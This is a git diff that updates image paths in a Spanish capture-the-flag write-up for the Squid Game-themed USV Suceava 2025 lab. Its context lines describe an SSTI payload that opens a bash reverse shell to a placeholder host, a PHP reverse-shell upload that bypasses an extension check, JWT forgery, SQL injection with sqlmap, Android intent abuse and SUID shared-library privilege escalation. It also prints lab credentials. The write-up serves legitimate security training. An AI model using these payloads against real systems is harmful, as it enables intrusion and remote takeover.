@@ -1,4 +1,4 @@
-![image_desc](USV_CTF_2025/img/CTF_USV_2025.jpg)
+![image_desc](img/CTF_USV_2025.jpg)
 
 # CTF USV Suceava 2025 (ONI-UCI Writeup)
 
@@ -33,34 +33,34 @@ Este CTF emula una infraestructura con temática de la serie "Squid Game".
 
 Después de jugar "luz-roja luz-verde" en el sitio web expuesto en el puerto 8080 nos dan una pista:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-194801_1348x600_scrot.png)
+![image_desc](img/2025-11-27-194801_1348x600_scrot.png)
 
 Esto sugiere SSTI en uno de los campos del formulario que actualiza la información del jugador. PoC: `{{ 2+2 }}`
 
 Sabemos que usa PHP asi que probamos con una carga útil para garantizarnos una reverse shell usando el motor de plantillas:  `{{ system("/bin/bash -i >& /dev/tcp/<IP>/<PUERTO> 0>&1)" }}`
 
-![image_desc](USV_CTF_2025/img/2025-11-27-194840_1346x477_scrot.png)
+![image_desc](img/2025-11-27-194840_1346x477_scrot.png)
 
 Una vez dentro revisamos el contenido de `/var/www/html/config.php` para obtener las credenciales de la base de datos y encontramos la primera bandera:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-195029_760x577_scrot.png)
+![image_desc](img/2025-11-27-195029_760x577_scrot.png)
 
 
 ## Flag 2 -- Subida de archivos insegura
 
-![image_desc](USV_CTF_2025/img/2025-11-27-195117_1341x397_scrot.png)
+![image_desc](img/2025-11-27-195117_1341x397_scrot.png)
 
 A pesar del mensaje  "Forbidden" devuelto en la raíz del sitio web expuesto en el puerto 8081 la ruta `/login.php` es accesible. Podemos iniciar sesión en la base de datos MySQL expuesta en el puerto 3306 con las credenciales encontradas en el primer reto y volcar la tabla `admin users`:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-195241_977x599_scrot.png)
+![image_desc](img/2025-11-27-195241_977x599_scrot.png)
 
 Las credenciales `front_man:red_light_green_light_456` son válidas para `/login.php`. Al iniciar sesión nos redirige a `/upload.php`:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-195319_1342x588_scrot.png)
+![image_desc](img/2025-11-27-195319_1342x588_scrot.png)
 
 Solo se permiten archivos con formato GIF, PNG, JPEG, PDF, etc. Sin embargo la lógica del programa solo valida la extensión. Podemos subir un archivo php malicioso que contenga una reverse shell bajo el nombre `file.png.php`:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-195412_1346x590_scrot.png)
+![image_desc](img/2025-11-27-195412_1346x590_scrot.png)
 
 Nos dan una pista de bajo que nombre se guarda el archivo en el servidor. Creamos un script para encontrar por fuerza bruta el posible archivo. Asumimos que la ruta es `/uploads/<file>` como ocurre usualmente:
 
@@ -104,28 +104,28 @@ if __name__ == "__main__":
     main()
 ```
 
-![image_desc](USV_CTF_2025/img/2025-11-27-205151_1337x530_scrot%201.png)
+![image_desc](img/2025-11-27-205151_1337x530_scrot%201.png)
 
 En `/var/www/html/prize-only-for-the-worthy-62t1etlet7/prize.txt` encontramos la segunda flag y unas credenciales:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-205350_772x335_scrot.png)
+![image_desc](img/2025-11-27-205350_772x335_scrot.png)
 
 ## Flag 3 -- Less Significative Bit (LSB) Steganography + Falsificación de JSON Web Tokens (JWT)
 
-![image_desc](USV_CTF_2025/img/2025-11-27-205445_1348x586_scrot.png)
+![image_desc](img/2025-11-27-205445_1348x586_scrot.png)
 
 En el sitio web expuesto en el puerto 8082 encontramos un `/robots.txt`:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-205459_1346x630_scrot.png)
+![image_desc](img/2025-11-27-205459_1346x630_scrot.png)
 
 Ambas rutas nos redirigen a `/login`. Con las credenciales encontradas en el reto anterior podemos iniciar sesión:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-205520_1345x618_scrot.png)
+![image_desc](img/2025-11-27-205520_1345x618_scrot.png)
 
 Tenemos acceso a `/status` pero no a `/organs`:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-205614_1341x630_scrot.png)
-![image_desc](USV_CTF_2025/img/2025-11-27-205634_1347x632_scrot.png)
+![image_desc](img/2025-11-27-205614_1341x630_scrot.png)
+![image_desc](img/2025-11-27-205634_1347x632_scrot.png)
 
 Si vemos las peticiones que se hacen al sitio con `curl` nos damos cuenta de que usa `React` o algun framework de Javascript como front-end. `React` renderiza completamente el sitio desde el Javascript. Si descargamos el archivo `main.js` tenemos acceso al código fuente del cliente. Si filtramos por los comentarios en HTML encontramos una pista:
 
@@ -154,21 +154,21 @@ De `main.js` podemos observar que la aplicación usa JWT para autenticación. Co
 
 Revisamos el JWT que tenemos:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-213410_1366x768_scrot%201.png)
+![image_desc](img/2025-11-27-213410_1366x768_scrot%201.png)
 
 Modificamos el campo `role` para convertirnos en un trabajador y firmamos el JWT con el secreto encontrado:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-213311_1366x768_scrot.png)
+![image_desc](img/2025-11-27-213311_1366x768_scrot.png)
 
 Ahora podemos acceder a `/organs` para obtener la tercera flag:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-213420_1366x768_scrot%201.png)
+![image_desc](img/2025-11-27-213420_1366x768_scrot%201.png)
 
 ## Flag 4 -- Structured Query Language Injection (SQLi)
 
 El campo de la barra de búsqueda (name) es inyectable:
 
-![image_desc](USV_CTF_2025/img/2025-11-28-193220_672x336_scrot.png)
+![image_desc](img/2025-11-28-193220_672x336_scrot.png)
 
 Con `sqlmap` podemos ver la base de datos `organsdb`:
 
@@ -370,8 +370,8 @@ Table: messages
 
 Este contiene un mensaje enorme codificado en base64. Lo decodificamos:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-215159_937x151_scrot.png)
-![image_desc](USV_CTF_2025/img/2025-11-27-215142_640x254_scrot.png)
+![image_desc](img/2025-11-27-215159_937x151_scrot.png)
+![image_desc](img/2025-11-27-215142_640x254_scrot.png)
 
 Es una imagen jpeg al parecer. Eliminamos los primeros tres bytes para convertirlo en una imagen válida:
 
@@ -383,20 +383,20 @@ dd if=hint of=hint.jpg ibs=1 skip=3;file hint.jpg
 hint.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, baseline, precision 8, 1024x1536, components 3
 ```
 
-![image_desc](USV_CTF_2025/img/image.jpg)
+![image_desc](img/image.jpg)
 
 
 La pista hace referencia al *port knocking*, un método para abrir puertos externamente generando intentos de conexión a un conjunto de puertos cerrados en un orden específico. Enviamos un paquete TCP SYN a los puertos 456, 218 y 67 respectivamente. Mágicamente el servidor SMTP en el puerto 25 ahora acepta conexiones. Ejecutamos el comando MESSAGE y obtenemos la quinta flag:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-215327_1151x608_scrot.png)
+![image_desc](img/2025-11-27-215327_1151x608_scrot.png)
 
 ## Flag 6 -- Intent Explotation
 
 Si probamos el comando *HISTORY* nos informa de la URL para descargar una APK. Hacemos port knocking nuevamente y descargamos el archivo:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-215504_1190x623_scrot.png)
+![image_desc](img/2025-11-27-215504_1190x623_scrot.png)
 
-![image_desc](USV_CTF_2025/img/2025-11-27-220403_1300x480_scrot.png)
+![image_desc](img/2025-11-27-220403_1300x480_scrot.png)
 
 Extraemos la APK con `apktools`:
 ```
@@ -419,7 +419,7 @@ I: Copying META-INF/services director
 Instalamos la APK y especificamos como host nuestra máquina vulnerable. 
 La aplicación cuenta con un menú de desarrollador al cual no tenemos acceso:
 
-![image_desc](USV_CTF_2025/img/Screenshot_20251129-095545_VIPs.jpg)
+![image_desc](img/Screenshot_20251129-095545_VIPs.jpg)
 
 ```
 grep -iRnE "secret"
@@ -485,18 +485,18 @@ adb shell am start -n com.squidgame.vips/.DevMenuActivity \
   --es decrypted_secret "front_man_secret_access_key"
 ```
 
-![image_desc](USV_CTF_2025/img/Screenshot_20251129-095232_VIPs.jpg)
+![image_desc](img/Screenshot_20251129-095232_VIPs.jpg)
 
 Al pulsar el botón *Check Vips* podemos obtener usuarios y contraseñas, incluyendo la sexta flag:
 
-![image_desc](USV_CTF_2025/img/photo_2025-11-28_22-06-24.jpg)
+![image_desc](img/photo_2025-11-28_22-06-24.jpg)
 ## Flag 7 -- Cronjob inseguro + SUID Shared Library Injection
 
 Con las credenciales `jack:UsbNQ3%dca98#SqD` podemos conectarnos vía SSH al servidor.
 
 En `/etc/cronjob` encontramos una tarea programada que ejecuta `/bin/update-lib.sh` cada 2 minutos. Buscando por binarios SUID encontramos un binario con SUID root `/usr/bin/squid`:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-220717_1366x768_scrot.png)
+![image_desc](img/2025-11-27-220717_1366x768_scrot.png)
 
 Identificamos que está empaquetado con UPX usando `strings squid | grep UPX` y lo desempaquetamos con `upx -d squid`.
 
@@ -741,7 +741,7 @@ __attribute__((constructor)) void init() {
 
 Esperamos a que ocurra el remplazo y ejecutamos `/usr/bin/squid VBA8T1+oJidOYCGNVLowJ0ZQNA5fqiHlX9M9Ll94MORv0DA+X4gwRQ==` para escalar privilegios y obtener la séptima y última flag:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-170328_1366x768_scrot.png)
+![image_desc](img/2025-11-27-170328_1366x768_scrot.png)
 ### Flags
 
 ```
